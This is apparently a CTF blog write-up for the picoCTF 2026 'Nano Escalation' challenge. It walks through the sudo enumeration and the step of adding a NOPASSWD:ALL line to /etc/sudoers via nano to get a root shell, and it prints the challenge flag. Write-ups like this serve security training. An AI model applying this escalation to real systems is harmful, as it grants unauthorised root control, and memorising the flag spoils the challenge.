# PicoCTF 2026 - Nano Escalation




{{< admonition tldr "TL;DR" >}}

**picoCTF 2026 - Nano Escalation** is a misc challenge from **picoCTF**. ---

{{< /admonition >}}

## Challenge Description
In this challenge, we are given SSH access to a remote server as the user `ctf-player` .  
Our objective is to retrieve the contents of `flag.txt` , which is not readable by the current user.

---

# Reconnaissance

First, connect to the target machine using SSH:

```bash
ssh -p 57097 ctf-player@crystal-peak.picoctf.net
```

After logging in, we check the files in the home directory:

```bash
ls
```

We found a file named:

```
flag.txt
```

Trying to read it results in a permission error:

```bash
cat flag.txt
```

Output:

```
cat: flag.txt: Permission denied
```

This indicates that the current user does not have sufficient privileges to read the flag.

---

# Enumeration

Next, we check what commands the user can run with `sudo` :

```bash
sudo -l
```

Output:

```
User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/nano /etc/sudoers
```

This means the user can run:

```
nano /etc/sudoers
```

as **root without requiring a password**.

This is a critical misconfiguration because `/etc/sudoers` controls sudo permissions.

---

# Vulnerability Analysis

Allowing a user to edit `/etc/sudoers` with elevated privileges is extremely dangerous.

If we can modify this file, we can grant ourselves unrestricted sudo access.

---

# Exploitation

Run nano with sudo privileges:

```bash
sudo nano /etc/sudoers
```

Add the following line at the bottom of the file:

```
ctf-player ALL=(ALL) NOPASSWD:ALL
```

Save the file and exit nano.

Now we can obtain a root shell:

```bash
sudo su
```

---

# Retrieving the Flag

After gaining root privileges, we can read the flag:

```bash
cat flag.txt
```

Output:

```
picoCTF{n4n0_411_7h3_w4y_7fcf8f8d}
```

---

# Flags

```
picoCTF{n4n0_411_7h3_w4y_7fcf8f8d}
```

---

# Lessons Learned

Misconfigured sudo permissions can lead to privilege escalation.  
Allowing users to edit `/etc/sudoers` with elevated privileges effectively grants them full control over the system.

Always restrict sudo permissions to only the necessary commands and avoid granting access to critical configuration files.


---

> Author: [spawn2pwn](https://github.com/nfl-alvis)  
> URL: https://ctf.spawn2pwn.my.id/posts/absolute-nano/  

